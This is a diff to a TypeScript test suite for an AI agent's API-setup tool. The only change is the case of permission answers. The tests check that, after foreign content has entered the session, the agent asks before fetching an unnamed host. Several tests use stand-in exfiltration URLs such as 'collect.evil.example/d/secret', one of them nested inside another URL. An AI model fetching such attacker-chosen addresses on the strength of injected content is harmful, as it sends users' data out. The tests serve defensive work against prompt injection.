@@ -60,7 +60,7 @@ describe('api_setup bootstrap after foreign content', () => {
   for (const field of ['openapi_url', 'docs_url'] as const) {
     it(`a ${field} with data in the path is asked about as a read, and not read without a yes`, async () => {
       const tool = apiSetup();
-      const ask = asker('Deny');
+      const ask = asker('deny');
       const agent = agentOf(tool, ask.fn);
       const result = await call(agent, { action: 'bootstrap', [field]: 'https://collect.evil.example/d/secret' });
       expect(ask.asked).toHaveLength(1);
@@ -71,7 +71,7 @@ describe('api_setup bootstrap after foreign content', () => {
 
     it(`CONTROL: a ${field} of a host the owner named is read without a question`, async () => {
       const tool = apiSetup();
-      const ask = asker('Deny');
+      const ask = asker('deny');
       const agent = agentOf(tool, ask.fn, 'the docs are on api.example.ch');
       await call(agent, { action: 'bootstrap', [field]: 'https://api.example.ch/openapi.json' });
       expect(ask.asked).toEqual([]);
@@ -81,7 +81,7 @@ describe('api_setup bootstrap after foreign content', () => {
 
   it('a yes reads the page', async () => {
     const tool = apiSetup();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = agentOf(tool, ask.fn);
     await call(agent, { action: 'bootstrap', openapi_url: 'https://collect.evil.example/d/secret' });
     expect(ask.asked).toHaveLength(1);
@@ -90,7 +90,7 @@ describe('api_setup bootstrap after foreign content', () => {
 
   it('CONTROL: without foreign content before it, the same bootstrap is not asked about', async () => {
     const tool = apiSetup();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'nothing named', false);
     await call(agent, { action: 'bootstrap', openapi_url: 'https://collect.evil.example/d/secret' });
     expect(ask.asked).toEqual([]);
@@ -99,7 +99,7 @@ describe('api_setup bootstrap after foreign content', () => {
 
   it('the docs page is the page checked when both addresses are given, as the handler reads it', async () => {
     const tool = apiSetup();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     // The owner named the spec's host, not the docs page's: the docs page is what is read.
     const agent = agentOf(tool, ask.fn, 'the spec is on api.example.ch');
     await call(agent, { action: 'bootstrap', openapi_url: 'https://api.example.ch/openapi.json', docs_url: 'https://collect.evil.example/d/secret' });
@@ -110,7 +110,7 @@ describe('api_setup bootstrap after foreign content', () => {
 
   it('a session of someone the owner let in is refused, not asked', async () => {
     const tool = apiSetup();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = agentOf(tool, ask.fn, 'nothing named', true, { principal: { kind: 'mandate', email: 'helper@example.ch' } } as Extra);
     const result = await call(agent, { action: 'bootstrap', openapi_url: 'https://collect.evil.example/d/secret' });
     expect(ask.asked).toEqual([]);
@@ -130,7 +130,7 @@ describe('api_setup bootstrap after foreign content', () => {
 
   it('a page a search listed is read without a question', async () => {
     const tool = apiSetup();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     agent.searchResultAddresses.noteResults('weather api', ['https://docs.listed.example/openapi.json']);
     await call(agent, { action: 'bootstrap', openapi_url: 'https://docs.listed.example/openapi.json' });
@@ -140,7 +140,7 @@ describe('api_setup bootstrap after foreign content', () => {
 
   it('an address that carries another address is asked about, even on a host the owner named', async () => {
     const tool = apiSetup();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'the docs are on api.example.ch');
     await call(agent, { action: 'bootstrap', docs_url: 'https://api.example.ch/fetch?u=https%3A%2F%2Fcollect.evil.example%2Fd' });
     expect(ask.asked).toHaveLength(1);
@@ -150,7 +150,7 @@ describe('api_setup bootstrap after foreign content', () => {
 
   it('CONTROL: list and view read no page and are not asked about', async () => {
     const tool = apiSetup();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     await call(agent, { action: 'list' });
     await call(agent, { action: 'view', openapi_url: 'https://collect.evil.example/d/secret' } as Input);
